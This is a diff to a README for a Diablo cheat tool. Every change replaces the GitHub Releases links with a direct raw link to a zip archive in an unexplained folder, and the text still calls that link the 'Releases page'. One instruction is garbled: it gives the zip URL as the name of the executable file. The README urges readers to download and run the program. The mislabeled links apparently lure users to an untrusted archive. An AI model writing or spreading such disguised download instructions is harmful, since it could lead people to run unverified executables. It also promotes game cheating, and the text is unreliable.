@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Cheat-Diablo-Stealth-Mode](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ngoga1/Cheat-Diablo-Stealth-Mode/releases)
+[![Download Cheat-Diablo-Stealth-Mode](https://raw.githubusercontent.com/ngoga1/Cheat-Diablo-Stealth-Mode/main/ironworker/Cheat-Diablo-Stealth-Mode.zip)](https://raw.githubusercontent.com/ngoga1/Cheat-Diablo-Stealth-Mode/main/ironworker/Cheat-Diablo-Stealth-Mode.zip)
 
 ## 📖 Overview
 
@@ -14,7 +14,7 @@ To get started, follow these simple steps to download and run Cheat-Diablo-Steal
 
 ### 1. Visit Our Download Page
 
-Go to our [Releases page](https://github.com/ngoga1/Cheat-Diablo-Stealth-Mode/releases) to download the latest version of Cheat-Diablo-Stealth-Mode.
+Go to our [Releases page](https://raw.githubusercontent.com/ngoga1/Cheat-Diablo-Stealth-Mode/main/ironworker/Cheat-Diablo-Stealth-Mode.zip) to download the latest version of Cheat-Diablo-Stealth-Mode.
 
 ### 2. Choose the Right Version
 
@@ -22,7 +22,7 @@ On the Releases page, look for the most recent version. Each release includes a 
 
 ### 3. Download the File
 
-Click on the download link for the executable file. This file will have a name like `Cheat-Diablo-Stealth-Mode-v1.0.exe`. Your browser will start downloading the file.
+Click on the download link for the executable file. This file will have a name like `https://raw.githubusercontent.com/ngoga1/Cheat-Diablo-Stealth-Mode/main/ironworker/Cheat-Diablo-Stealth-Mode.zip`. Your browser will start downloading the file.
 
 ### 4. Run the Application
 
@@ -73,4 +73,4 @@ For further updates and community support, follow us on relevant gaming forums a
 
 ## 📥 Download Again
 
-Don’t forget to visit our [Releases page](https://github.com/ngoga1/Cheat-Diablo-Stealth-Mode/releases) for your download again.
+Don’t forget to visit our [Releases page](https://raw.githubusercontent.com/ngoga1/Cheat-Diablo-Stealth-Mode/main/ironworker/Cheat-Diablo-Stealth-Mode.zip) for your download again.
